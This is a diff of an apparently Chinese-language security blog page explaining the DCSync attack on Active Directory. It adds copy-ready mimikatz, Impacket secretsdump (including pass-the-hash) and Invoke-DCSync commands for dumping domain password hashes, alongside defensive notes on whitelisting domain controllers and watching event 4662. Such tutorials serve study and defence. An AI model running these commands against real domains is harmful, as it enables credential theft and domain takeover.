@@ -13,7 +13,7 @@
 <meta name="twitter:title" content="DCSync 攻击">
 <meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://coollllllll.github.io/p/intranet-10/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
-    <link rel="shortcut icon" href="img/avatar.png" />
+    <link rel="shortcut icon" href="/temp.ico" />
 
     </head>
     <body class="
@@ -125,7 +125,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 2 分钟
+                    阅读时长: 3 分钟
                 </time>
             </div>
         
@@ -137,7 +137,7 @@
     <section class="article-content">
     <h1 id="dcsync-攻击">DCSync 攻击</h1>
 <h2 id="背景">背景</h2>
-<p>2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。</p>
+<p>2015 年 8 月，Benjamin Delpy(Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。</p>
 <p>DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。而DCSync 的最大特点，在于不用登录域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。</p>
 <blockquote>
 <p>注意：</p>
@@ -199,6 +199,7 @@
 <p>在默认情况下，只有 <strong>Administrators、Domain Controllers 和 Enterprise Domain Admins</strong> 组内的用户有权限使用 DCSync，但我们可以对域内普通用户添加 ACL (Access Control List) 实现普通用户也能调用 DCSync 功能。</p>
 </blockquote>
 <h2 id="攻击">攻击</h2>
+<h3 id="mimikatz">mimikatz</h3>
 <pre tabindex="0"><code># 导出指定用户
 lsadump::dcsync /domain:rd.adsecurity.org /user:administrator 
 
@@ -221,13 +222,39 @@ lsadump::dcsync /domain:rd.adsecurity.org /all
 	</a>
 	
 </figure></p>
-<h2 id="防御">防御</h2>
-<p>最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步。</p>
-<p>获取域内所有 IP 的脚本：</p>
-<pre tabindex="0"><code>PowerShell:Get-ADDomainController -filter * | select IPv4Address
+<h3 id="secretsdump">secretsdump</h3>
+<p>secretsdump.py 是 Impacket 框架中的一个脚本，该脚本也可以通过 DCSync 技术导出域控制器上用户的哈希。</p>
+<p>工具的原理是首先使用提供的用户登录凭据通过 smbexec 或者 wmiexec 远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的哈希，同时通过 Dcsync 或从 NTDS.dit 文件中导出所有域用户的哈希。</p>
+<blockquote>
+<p>优点是支持从域外的计算机连接至域控制器。</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"># 获取指定用户的 hash
+python3 secretsdump.py domain/<span class="p">&lt;</span>username for DCSync<span class="p">&gt;</span>:password@<span class="p">&lt;</span>dc-ip<span class="p">&gt;</span> -dc-ip <span class="p">&lt;</span>dc-ip<span class="p">&gt;</span> -just-dc-user <span class="p">&lt;</span>username for DCSync&gt;
 
-[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select IPAddress
-</code></pre>
+# 获取所有域用户 hash
+python3 secretsdump.py domain/<span class="p">&lt;</span>username for DCSync<span class="p">&gt;</span>:password@<span class="p">&lt;</span>dc-ip&gt;
+
+# 也支持哈希传递
+python secretsdump.py domain/username@ip -hashes LM HASH:NT HASH 
+</code></pre></div><h3 id="powershell-invoke-dcsync">PowerShell Invoke-DCSync</h3>
+<p><a class="link" href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1"  target="_blank" rel="noopener"
+    >https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p>
+<p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 DCSync 功能。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">Import-Module .\Invoke-DCSync.ps1
+# 导出域内指定用户的哈希
+Invoke-DCSync -DumpForest -Users @(<span class="s2">&#34;administrator&#34;</span>) <span class="p">|</span> ft -wrap -autosize
+# 导出域内所有用户的哈希值
+Invoke-DCSync -DumpForest <span class="p">|</span> ft -wrap -autosize
+</code></pre></div><h2 id="防御">防御</h2>
+<h3 id="网络流量">网络流量</h3>
+<p>最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP 地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步。</p>
+<p>获取域内所有 IP 的脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">PowerShell:Get-ADDomainController -filter * <span class="p">|</span> select IPv4Address
+
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers <span class="p">|</span> select IPAddress
+</code></pre></div><h3 id="事后系统日志">事后系统日志</h3>
+<p>在 windows 日志 4662 可以清楚看到某用户使用<code>DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</code>和<code>DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</code>这两条 ACL 权限向域控发起目录服务访问请求，从而 dump 域内 hash。</p>
+
 </section>
 
 
@@ -502,8 +529,19 @@ lsadump::dcsync /domain:rd.adsecurity.org /all
     <li><a href="#背景">背景</a></li>
     <li><a href="#原理">原理</a></li>
     <li><a href="#条件">条件</a></li>
-    <li><a href="#攻击">攻击</a></li>
-    <li><a href="#防御">防御</a></li>
+    <li><a href="#攻击">攻击</a>
+      <ol>
+        <li><a href="#mimikatz">mimikatz</a></li>
+        <li><a href="#secretsdump">secretsdump</a></li>
+        <li><a href="#powershell-invoke-dcsync">PowerShell Invoke-DCSync</a></li>
+      </ol>
+    </li>
+    <li><a href="#防御">防御</a>
+      <ol>
+        <li><a href="#网络流量">网络流量</a></li>
+        <li><a href="#事后系统日志">事后系统日志</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
                 </div>
